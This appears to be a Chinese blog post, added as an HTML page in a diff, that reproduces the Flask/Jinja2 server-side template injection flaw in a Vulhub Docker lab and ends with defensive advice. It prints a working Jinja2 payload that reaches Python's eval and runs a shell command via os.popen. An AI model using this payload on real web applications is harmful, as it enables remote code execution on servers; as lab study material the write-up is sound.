@@ -1,0 +1,169 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Flask（Jinja2） 服务端模板注入漏洞 | fanson&#39;s Blog</title>
+
+  
+  <meta name="author" content="fanson">
+  
+
+  
+  <meta name="description" content="陪你走过那山高水长
+陪你一起生长
+
+周末拈来一本书，刚好看到之前学习的Flask，今天刚好来学习下服务器模板注入（SSTI），来记录一下：
+0x00 漏洞介绍
+服务端模板注入（SSTI）:服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，若用户插入了相关恶意">
+  
+
+  
+  
+  <meta name="keywords" content="Python/Flask">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Flask（Jinja2） 服务端模板注入漏洞"/>
+
+  <meta property="og:site_name" content="fanson&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">fanson&#39;s Blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Flask（Jinja2） 服务端模板注入漏洞</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-31T03:29:22.000Z">
+          2019-03-31
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <blockquote>
+<p>陪你走过那山高水长</p>
+<p>陪你一起生长</p>
+</blockquote>
+<p>周末拈来一本书，刚好看到之前学习的<code>Flask</code>，今天刚好来学习下服务器模板注入（<code>SSTI</code>），来记录一下：</p>
+<p><strong><em>0x00 漏洞介绍</em></strong></p>
+<p>服务端模板注入（<code>SSTI</code>）:服务端接收了用户的输入，将其作为 <code>Web</code> 应用模板内容的一部分，在进行目标编译渲染的过程中，若用户插入了相关恶意内容，结果可能导致了敏感信息泄露、代码执行、<code>GetShell</code> 等问题，所以永远不要相信用户输入。</p>
+<p><strong>Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers’ internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.[from us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp]</strong></p>
+<p><strong><em>0x01 环境搭建</em></strong></p>
+<p><code>Vulhub</code>简直不要太方便了</p>
+<p>在ubuntu16.04下安装<code>docker/docker-compose</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 安装pip</span><br><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br><span class="line"></span><br><span class="line"># 安装最新版docker</span><br><span class="line">curl -s https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line"># 启动docker服务</span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"># 安装compose</span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 下载项目</span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#测试完成后，删除整个环境</span><br><span class="line"></span><br><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
+<p><strong><em>0x02 漏洞复现</em></strong></p>
+<p>搭建环境完成后，访问<code>http://your-ip/?name=66</code>，得到66，说明SSTI漏洞存在。</p>
+<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/1.PNG" alt=""></p>
+<p>在这种漏洞下，我们可以获取到inja2中可以获取的数据，jinja2设计被运行在沙箱中，来以保证安全，若我们能逃逸jinja2的沙箱，那么我们就可以实现命令执行让对方服务器运行我们指定的恶意代码，以达到getshell或者文件读取的目的。</p>
+<p>沙箱逃逸部分有时间补上！</p>
+<p>接下来获取eval函数并执行任意python代码。[poc来自<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">github</a>]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/2.PNG" alt=""></p>
+<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/3.PNG" alt=""></p>
+<p><strong><em>0x03 防范与总结</em></strong></p>
+<ul>
+<li><p>始终不要相信用户输入，将用户输入传递到模板当中，或者对输入的数据进行过滤与转义</p>
+</li>
+<li><p>将模板内容与view代码分离</p>
+</li>
+<li>最好把模板和参数分离</li>
+</ul>
+<p><strong><em>0x04 参考</em></strong></p>
+<p>[1]<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p>[2]<a href="https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/</a></p>
+<p>[3]<a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Python-Flask/">Python/Flask</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 fanson
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
